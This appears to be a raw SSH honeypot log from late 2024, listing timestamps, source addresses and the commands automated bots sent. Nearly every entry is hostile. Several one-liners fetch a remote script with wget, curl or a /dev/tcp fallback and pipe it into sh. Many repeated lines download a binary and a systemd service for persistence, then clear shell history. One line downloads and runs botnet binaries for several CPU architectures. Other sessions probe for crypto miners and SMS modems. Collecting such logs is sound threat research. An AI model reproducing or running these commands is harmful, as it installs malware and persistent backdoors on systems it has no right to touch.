start
2024-11-29 14:40:17.460267 - ('141.0.99.244', 44570) - /ip cloud print

2024-12-01 09:27:26.670049 - ('87.120.113.231', 36656) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 12:27:33.398164 - ('141.98.10.198', 40288) - apt
2024-12-01 12:27:48.014473 - ('141.98.10.198', 40288) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 12:27:51.670845 - ('141.98.10.198', 59836) - apt
2024-12-01 12:27:54.074515 - ('141.98.10.198', 59836) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 12:28:03.184560 - ('141.98.10.198', 46584) - apt
2024-12-01 12:28:05.246378 - ('141.98.10.198', 46584) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 12:28:14.751391 - ('141.98.10.198', 39380) - apt
2024-12-01 12:28:16.150682 - ('141.98.10.198', 39380) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 12:34:21.783250 - ('141.98.10.198', 37906) - apt
2024-12-01 12:34:24.037938 - ('141.98.10.198', 37906) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 12:34:29.817312 - ('141.98.10.198', 47822) - apt
2024-12-01 12:34:32.174188 - ('141.98.10.198', 47822) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-03 22:29:00.348934 - ('124.54.248.226', 39637) - /ip cloud print
2024-12-03 22:29:01.476869 - ('124.54.248.226', 39637) - ifconfig
2024-12-03 22:29:02.396685 - ('124.54.248.226', 39637) - uname -a
2024-12-03 22:29:03.316913 - ('124.54.248.226', 39637) - cat /proc/cpuinfo
2024-12-03 22:29:04.237110 - ('124.54.248.226', 39637) - ps | grep '[Mm]iner'
2024-12-03 22:29:05.160724 - ('124.54.248.226', 39637) - ps -ef | grep '[Mm]iner'
2024-12-03 22:29:06.084564 - ('124.54.248.226', 39637) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-03 22:29:07.012578 - ('124.54.248.226', 39637) - echo Hi | cat -n
2024-12-03 22:29:55.542889 - ('140.245.32.211', 38250) - /ip cloud print
2024-12-03 22:29:56.045562 - ('140.245.32.211', 38250) - ifconfig
2024-12-03 22:29:56.381331 - ('140.245.32.211', 38250) - uname -a
2024-12-03 22:29:56.764467 - ('140.245.32.211', 38250) - cat /proc/cpuinfo
2024-12-03 22:29:57.143265 - ('140.245.32.211', 38250) - ps | grep '[Mm]iner'
2024-12-03 22:29:57.528755 - ('140.245.32.211', 38250) - ps -ef | grep '[Mm]iner'
2024-12-03 22:29:57.889403 - ('140.245.32.211', 38250) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-03 22:29:58.273991 - ('140.245.32.211', 38250) - echo Hi | cat -n
2024-12-03 22:33:11.667314 - ('24.119.20.99', 55958) - /ip cloud print
2024-12-03 22:33:13.412730 - ('24.119.20.99', 55958) - ifconfig
2024-12-03 22:33:14.860388 - ('24.119.20.99', 55958) - uname -a
2024-12-03 22:33:16.335740 - ('24.119.20.99', 55958) - cat /proc/cpuinfo
2024-12-03 22:33:17.776576 - ('24.119.20.99', 55958) - ps | grep '[Mm]iner'
2024-12-03 22:33:19.421620 - ('24.119.20.99', 55958) - ps -ef | grep '[Mm]iner'
2024-12-03 22:33:20.857897 - ('24.119.20.99', 55958) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-03 22:33:22.292365 - ('24.119.20.99', 55958) - echo Hi | cat -n
2024-12-04 00:26:35.323034 - ('58.75.228.148', 53385) - /ip cloud print
2024-12-04 00:26:37.091940 - ('58.75.228.148', 53385) - ifconfig
2024-12-04 00:26:38.471455 - ('58.75.228.148', 53385) - uname -a
2024-12-04 00:26:39.852052 - ('58.75.228.148', 53385) - cat /proc/cpuinfo
2024-12-04 00:26:41.227513 - ('58.75.228.148', 53385) - ps | grep '[Mm]iner'
2024-12-04 00:26:42.608481 - ('58.75.228.148', 53385) - ps -ef | grep '[Mm]iner'
2024-12-04 00:26:43.996145 - ('58.75.228.148', 53385) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 00:26:45.388227 - ('58.75.228.148', 53385) - echo Hi | cat -n
2024-12-04 07:48:12.831043 - ('87.120.113.231', 52860) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-04 09:08:51.982630 - ('87.120.113.231', 50152) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-04 09:27:49.732791 - ('180.226.237.194', 37186) - /ip cloud print
2024-12-04 09:27:50.980835 - ('180.226.237.194', 37186) - ifconfig
2024-12-04 09:27:51.999843 - ('180.226.237.194', 37186) - uname -a
2024-12-04 09:27:53.015764 - ('180.226.237.194', 37186) - cat /proc/cpuinfo
2024-12-04 09:27:54.028378 - ('180.226.237.194', 37186) - ps | grep '[Mm]iner'
2024-12-04 09:27:55.046752 - ('180.226.237.194', 37186) - ps -ef | grep '[Mm]iner'
2024-12-04 09:27:56.068167 - ('180.226.237.194', 37186) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 09:27:57.086785 - ('180.226.237.194', 37186) - echo Hi | cat -n
2024-12-04 11:34:53.636788 - ('124.54.253.11', 44653) - /ip cloud print
2024-12-04 11:34:54.861293 - ('124.54.253.11', 44653) - ifconfig
2024-12-04 11:34:55.920765 - ('124.54.253.11', 44653) - uname -a
2024-12-04 11:34:56.902543 - ('124.54.253.11', 44653) - cat /proc/cpuinfo
2024-12-04 11:34:57.884585 - ('124.54.253.11', 44653) - ps | grep '[Mm]iner'
2024-12-04 11:34:58.913089 - ('124.54.253.11', 44653) - ps -ef | grep '[Mm]iner'
2024-12-04 11:34:59.893207 - ('124.54.253.11', 44653) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 11:35:00.876762 - ('124.54.253.11', 44653) - echo Hi | cat -n
2024-12-04 11:45:40.023384 - ('49.160.126.210', 58823) - /ip cloud print
2024-12-04 11:45:41.197882 - ('49.160.126.210', 58823) - ifconfig
2024-12-04 11:45:42.426689 - ('49.160.126.210', 58823) - uname -a
2024-12-04 11:45:43.513204 - ('49.160.126.210', 58823) - cat /proc/cpuinfo
2024-12-04 11:45:44.587993 - ('49.160.126.210', 58823) - ps | grep '[Mm]iner'
2024-12-04 11:45:45.588256 - ('49.160.126.210', 58823) - ps -ef | grep '[Mm]iner'
2024-12-04 11:45:46.572986 - ('49.160.126.210', 58823) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 11:45:47.560420 - ('49.160.126.210', 58823) - echo Hi | cat -n
2024-12-04 12:29:04.906367 - ('180.225.156.159', 35019) - /ip cloud print
2024-12-04 12:29:06.647709 - ('180.225.156.159', 35019) - ifconfig
2024-12-04 12:29:08.035694 - ('180.225.156.159', 35019) - uname -a
2024-12-04 12:29:09.581994 - ('180.225.156.159', 35019) - cat /proc/cpuinfo
2024-12-04 12:29:11.001551 - ('180.225.156.159', 35019) - ps | grep '[Mm]iner'
2024-12-04 12:29:12.543473 - ('180.225.156.159', 35019) - ps -ef | grep '[Mm]iner'
2024-12-04 12:29:14.162293 - ('180.225.156.159', 35019) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 12:29:15.736024 - ('180.225.156.159', 35019) - echo Hi | cat -n
2024-12-04 12:52:02.880219 - ('180.227.48.196', 50074) - /ip cloud print
2024-12-04 12:52:04.012390 - ('180.227.48.196', 50074) - ifconfig
2024-12-04 12:52:04.945675 - ('180.227.48.196', 50074) - uname -a
2024-12-04 12:52:05.874424 - ('180.227.48.196', 50074) - cat /proc/cpuinfo
2024-12-04 12:52:06.799617 - ('180.227.48.196', 50074) - ps | grep '[Mm]iner'
2024-12-04 12:52:07.722766 - ('180.227.48.196', 50074) - ps -ef | grep '[Mm]iner'
2024-12-04 12:52:08.647360 - ('180.227.48.196', 50074) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 12:52:09.575065 - ('180.227.48.196', 50074) - echo Hi | cat -n
2024-12-04 14:11:05.067269 - ('182.215.66.232', 40302) - /ip cloud print
2024-12-04 14:11:06.237505 - ('182.215.66.232', 40302) - ifconfig
2024-12-04 14:11:07.193054 - ('182.215.66.232', 40302) - uname -a
2024-12-04 14:11:08.148824 - ('182.215.66.232', 40302) - cat /proc/cpuinfo
2024-12-04 14:11:09.104146 - ('182.215.66.232', 40302) - ps | grep '[Mm]iner'
2024-12-04 14:11:10.054627 - ('182.215.66.232', 40302) - ps -ef | grep '[Mm]iner'
2024-12-04 14:11:11.010791 - ('182.215.66.232', 40302) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 14:11:11.962864 - ('182.215.66.232', 40302) - echo Hi | cat -n
2024-12-04 21:21:25.189499 - ('49.160.223.245', 46027) - /ip cloud print
2024-12-04 21:21:26.303846 - ('49.160.223.245', 46027) - ifconfig
2024-12-04 21:21:27.208148 - ('49.160.223.245', 46027) - uname -a
2024-12-04 21:21:28.111507 - ('49.160.223.245', 46027) - cat /proc/cpuinfo
2024-12-04 21:21:29.019979 - ('49.160.223.245', 46027) - ps | grep '[Mm]iner'
2024-12-04 21:21:29.927611 - ('49.160.223.245', 46027) - ps -ef | grep '[Mm]iner'
2024-12-04 21:21:30.836992 - ('49.160.223.245', 46027) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-04 21:21:31.743386 - ('49.160.223.245', 46027) - echo Hi | cat -n
2024-12-05 01:06:17.502421 - ('154.213.187.182', 42872) - cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf mips; wget http://154.216.19.215/mips; chmod +x mips; ./mips ssh.mips; rm -rf mpsl; wget http://154.216.19.215/mpsl; chmod +x mpsl; ./mpsl ssh.mpsl; rm -rf arm; wget http://154.216.19.215/arm; chmod +x arm; ./arm ssh.arm; rm -rf arm5; wget http://154.216.19.215/arm5; chmod +x arm5; ./arm5 ssh.arm5; rm -rf arm7; wget http://154.216.19.215/arm7; chmod +x arm7; ./arm7 ssh.arm7; rm -rf x86; wget http://154.216.19.215/x86; chmod +x x86; ./x86 ssh.x86; rm -rf arm; curl -o arm http://154.216.19.215/arm; chmod +x arm; ./arm ssh.arm; rm -rf arm5; curl -o arm5 http://154.216.19.215/arm5; chmod +x arm5; ./arm5 ssh.arm5; rm -rf arm7; curl -o arm7 http://154.216.19.215/arm7; chmod +x arm7; ./arm7 ssh.arm7; rm -rf x86; curl -o x86 http://154.216.19.215/x86; chmod +x x86; ./x86 ssh.x86; rm -rf mips; curl -o mips http://154.216.19.215/mips; chmod +x mips; ./mips ssh.mips; rm -rf mpsl; curl -o mpsl http://154.216.19.215/mpsl; chmod +x mpsl; ./mpsl ssh.mpsl;
2024-12-05 01:36:40.888024 - ('87.120.113.231', 44044) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-05 02:12:04.116211 - ('211.250.243.240', 46310) - /ip cloud print
2024-12-05 02:12:05.915932 - ('211.250.243.240', 46310) - ifconfig
2024-12-05 02:12:07.319752 - ('211.250.243.240', 46310) - uname -a
2024-12-05 02:12:08.732008 - ('211.250.243.240', 46310) - cat /proc/cpuinfo
2024-12-05 02:12:10.136086 - ('211.250.243.240', 46310) - ps | grep '[Mm]iner'
2024-12-05 02:12:11.555785 - ('211.250.243.240', 46310) - ps -ef | grep '[Mm]iner'
2024-12-05 02:12:12.995882 - ('211.250.243.240', 46310) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 02:12:14.413127 - ('211.250.243.240', 46310) - echo Hi | cat -n
2024-12-05 04:17:20.859237 - ('119.68.202.197', 43101) - /ip cloud print
2024-12-05 04:17:21.967974 - ('119.68.202.197', 43101) - ifconfig
2024-12-05 04:17:22.876896 - ('119.68.202.197', 43101) - uname -a
2024-12-05 04:17:23.783058 - ('119.68.202.197', 43101) - cat /proc/cpuinfo
2024-12-05 04:17:24.687263 - ('119.68.202.197', 43101) - ps | grep '[Mm]iner'
2024-12-05 04:17:25.590927 - ('119.68.202.197', 43101) - ps -ef | grep '[Mm]iner'
2024-12-05 04:17:26.490971 - ('119.68.202.197', 43101) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 04:17:27.390910 - ('119.68.202.197', 43101) - echo Hi | cat -n
2024-12-05 04:54:37.247963 - ('45.148.10.203', 55284) - apt
2024-12-05 04:54:38.481831 - ('45.148.10.203', 55284) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:54:45.448535 - ('45.148.10.203', 56786) - apt
2024-12-05 04:54:46.596814 - ('45.148.10.203', 56786) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:54:53.602587 - ('45.148.10.203', 42970) - apt
2024-12-05 04:54:54.771249 - ('45.148.10.203', 42970) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:02.055058 - ('45.148.10.203', 42978) - apt
2024-12-05 04:55:03.274488 - ('45.148.10.203', 42978) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:10.490497 - ('45.148.10.203', 55796) - apt
2024-12-05 04:55:11.597224 - ('45.148.10.203', 55796) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:18.790806 - ('45.148.10.203', 40164) - apt
2024-12-05 04:55:20.025985 - ('45.148.10.203', 40164) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:27.182970 - ('45.148.10.203', 54428) - apt
2024-12-05 04:55:28.351876 - ('45.148.10.203', 54428) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:35.510201 - ('45.148.10.203', 41900) - apt
2024-12-05 04:55:36.731009 - ('45.148.10.203', 41900) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:43.873142 - ('45.148.10.203', 47918) - apt
2024-12-05 04:55:45.085634 - ('45.148.10.203', 47918) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:55:52.205583 - ('45.148.10.203', 47924) - apt
2024-12-05 04:55:53.409135 - ('45.148.10.203', 47924) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:56:00.353891 - ('45.148.10.203', 36298) - apt
2024-12-05 04:56:01.447875 - ('45.148.10.203', 36298) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 04:56:08.608952 - ('45.148.10.203', 40402) - apt
2024-12-05 04:56:09.829191 - ('45.148.10.203', 40402) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-05 05:28:02.072633 - ('180.225.187.217', 53540) - /ip cloud print
2024-12-05 05:28:03.275514 - ('180.225.187.217', 53540) - ifconfig
2024-12-05 05:28:04.333255 - ('180.225.187.217', 53540) - uname -a
2024-12-05 05:28:05.355518 - ('180.225.187.217', 53540) - cat /proc/cpuinfo
2024-12-05 05:28:06.343972 - ('180.225.187.217', 53540) - ps | grep '[Mm]iner'
2024-12-05 05:28:07.327350 - ('180.225.187.217', 53540) - ps -ef | grep '[Mm]iner'
2024-12-05 05:28:08.312461 - ('180.225.187.217', 53540) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 05:28:09.296710 - ('180.225.187.217', 53540) - echo Hi | cat -n
2024-12-05 06:08:45.707209 - ('116.38.107.242', 45498) - /ip cloud print
2024-12-05 06:08:46.839254 - ('116.38.107.242', 45498) - ifconfig
2024-12-05 06:08:47.763346 - ('116.38.107.242', 45498) - uname -a
2024-12-05 06:08:48.687171 - ('116.38.107.242', 45498) - cat /proc/cpuinfo
2024-12-05 06:08:49.611106 - ('116.38.107.242', 45498) - ps | grep '[Mm]iner'
2024-12-05 06:08:50.535100 - ('116.38.107.242', 45498) - ps -ef | grep '[Mm]iner'
2024-12-05 06:08:51.458915 - ('116.38.107.242', 45498) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 06:08:52.378985 - ('116.38.107.242', 45498) - echo Hi | cat -n
2024-12-05 06:26:44.449922 - ('119.68.123.115', 58614) - /ip cloud print
2024-12-05 06:26:45.581961 - ('119.68.123.115', 58614) - ifconfig
2024-12-05 06:26:46.525934 - ('119.68.123.115', 58614) - uname -a
2024-12-05 06:26:47.453998 - ('119.68.123.115', 58614) - cat /proc/cpuinfo
2024-12-05 06:26:48.381712 - ('119.68.123.115', 58614) - ps | grep '[Mm]iner'
2024-12-05 06:26:49.305805 - ('119.68.123.115', 58614) - ps -ef | grep '[Mm]iner'
2024-12-05 06:26:50.229617 - ('119.68.123.115', 58614) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 06:26:51.153702 - ('119.68.123.115', 58614) - echo Hi | cat -n
2024-12-05 07:53:00.785076 - ('50.190.140.117', 53967) - /ip cloud print
2024-12-05 07:53:02.490915 - ('50.190.140.117', 53967) - ifconfig
2024-12-05 07:53:03.876821 - ('50.190.140.117', 53967) - uname -a
2024-12-05 07:53:05.262472 - ('50.190.140.117', 53967) - cat /proc/cpuinfo
2024-12-05 07:53:06.649676 - ('50.190.140.117', 53967) - ps | grep '[Mm]iner'
2024-12-05 07:53:08.032598 - ('50.190.140.117', 53967) - ps -ef | grep '[Mm]iner'
2024-12-05 07:53:09.436229 - ('50.190.140.117', 53967) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-05 07:53:10.816184 - ('50.190.140.117', 53967) - echo Hi | cat -n
2024-12-05 07:58:28.761281 - ('87.120.113.231', 58516) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-05 09:06:46.291721 - ('14.6.81.179', 43782) - /ip cloud print
2024-12-05 09:06:47.430998 - ('14.6.81.179', 43782) - ifconfig
2024-12-05 09:06:48.361682 - ('14.6.81.179', 43782) - uname -a
2024-12-05 09:06:49.292553 - ('14.6.81.179', 43782) - cat /proc/cpuinfo
2024-12-05 09:06:50.219140 - ('14.6.81.179', 43782) - ps | grep '[Mm]iner'
2024-12-05 09:06:51.150202 - ('14.6.81.179', 43782) - ps -ef | grep '[Mm]iner'
2024-12-05 09:06:52.083920 - ('14.6.81.179', 43782) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
